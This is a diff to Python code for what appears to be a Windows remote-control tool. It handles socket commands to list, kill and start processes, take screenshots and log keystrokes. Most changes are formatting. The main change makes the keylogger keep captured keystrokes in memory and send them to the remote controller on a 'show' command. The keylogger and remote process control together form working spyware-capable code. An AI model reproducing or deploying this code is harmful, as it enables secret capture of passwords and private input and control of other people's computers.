@@ -20,6 +20,7 @@ GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
 IsWindowVisible = ctypes.windll.user32.IsWindowVisible
 GetWindowThreadProcessId = ctypes.windll.user32.GetWindowThreadProcessId
 
+
 class ProcessRunning:
     def __init__(self, _sock, message):
         self._sock = _sock
@@ -27,15 +28,14 @@ class ProcessRunning:
         self.message = message[5:]
         logging.debug('receive {} {}'.format(self.opcode, self.message))
 
-
     def do_task(self):
         if self.opcode == 'get__':
             self.send_process_list()
         if self.opcode == 'kill_':
-            self.kill_proc_tree(pid = int(self.message))
+            self.kill_proc_tree(pid=int(self.message))
         if self.opcode == 'start':
             self.startprocess(self.message)
-            
+
     def send_process_list(self):
         for proc in psutil.process_iter():
             try:
@@ -47,9 +47,9 @@ class ProcessRunning:
             except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                 pass
         self._sock.sendall('done'.encode('utf-8'))
-    
+
     def kill_proc_tree(self, pid, sig=signal.SIGTERM, include_parent=True,
-                    timeout=None, on_terminate=None):
+                       timeout=None, on_terminate=None):
         parent = psutil.Process(pid)
         children = parent.children(recursive=True)
         if include_parent:
@@ -64,7 +64,6 @@ class ProcessRunning:
         psutil.Popen(str(process))
 
 
-
 class AppRunning:
     def __init__(self, _sock, message):
         self._sock = _sock
@@ -77,7 +76,7 @@ class AppRunning:
         if self.opcode == 'get__':
             self.send_process_list()
         if self.opcode == 'kill_':
-            self.kill_proc_tree(pid = int(self.message))
+            self.kill_proc_tree(pid=int(self.message))
         if self.opcode == 'start':
             self.startprocess(self.message)
 
@@ -165,39 +164,40 @@ class Screenshot:
             return '00'  # Successful
 
 
+key_str = []
+
+
 class Keystroke:
     def __init__(self, sock, opcode):
         self.sock = sock
         self.opcode = opcode
 
     def on_press(self, key):
-
-        with open('keylogger.txt', 'a') as f:
-            try:
-                f.write('{0}'.format(key.char))
-            except AttributeError:
-                if key == keyboard.Key.home:
-                    pass
-                elif key == keyboard.Key.shift:
-                    f.write('')
-                elif key == keyboard.Key.ctrl:
-                    f.write('')
-                elif key == keyboard.Key.alt:
-                    f.write('')
-                elif key == keyboard.Key.alt_gr:
-                    f.write('')
-                elif key == keyboard.Key.esc:
-                    f.write('')
-                elif key == keyboard.Key.tab:
-                    f.write('\t')
-                elif key == keyboard.Key.enter:
-                    f.write('\n')
-                elif key == keyboard.Key.backspace:
-                    f.write('BACKSPACE')
-                elif key == keyboard.Key.delete:
-                    f.write('DELETE')
-                else:
-                    f.write('{0}'.format(key))
+        try:
+            key_str.append(key.char)
+        except AttributeError:
+            if key == keyboard.Key.home:
+                pass
+            elif key == keyboard.Key.shift:
+                key_str.append('')
+            elif key == keyboard.Key.ctrl:
+                key_str.append('')
+            elif key == keyboard.Key.alt:
+                key_str.append('')
+            elif key == keyboard.Key.alt_gr:
+                key_str.append('')
+            elif key == keyboard.Key.esc:
+                key_str.append('')
+            elif key == keyboard.Key.tab:
+                key_str.append('\t')
+            elif key == keyboard.Key.enter:
+                key_str.append('\n')
+            elif key == keyboard.Key.backspace:
+                key_str.append('BACKSPACE')
+            elif key == keyboard.Key.delete:
+                key_str.append('DELETE')
+            else:
+                key_str.append(key)
 
     def on_release(self, key):
         if key == keyboard.Key.home:
@@ -209,27 +209,18 @@ class Keystroke:
             on_release=self.on_release)
 
         if self.opcode == 'hook':
-            if os.path.exists('keylogger.txt'):
-                os.remove('keylogger.txt')
             listener.start()
 
         elif self.opcode == 'unhook':
-            with open('keylogger.txt', 'w') as f:
-                f.write('')
             stop = keyboard.Controller()
             stop.press(keyboard.Key.home)
             stop.release(keyboard.Key.home)
 
         elif self.opcode == 'show':
-            if os.path.exists('keylogger.txt'):
-                with open('keylogger.txt', 'r') as f:
-                    data = f.read()
-                    if data != '':
-                        self.sock.sendall(data.encode('utf8'))
-                        print(data)
-                    else:
-                        exit_code = '05forced_exit'
-                        self.sock.sendall(exit_code.encode('utf8'))
+            if key_str:
+                data = ''.join(key_str)
+                self.sock.sendall(data.encode('utf8'))
+                print(data)
             else:
                 exit_code = '05forced_exit'
                 self.sock.sendall(exit_code.encode('utf8'))
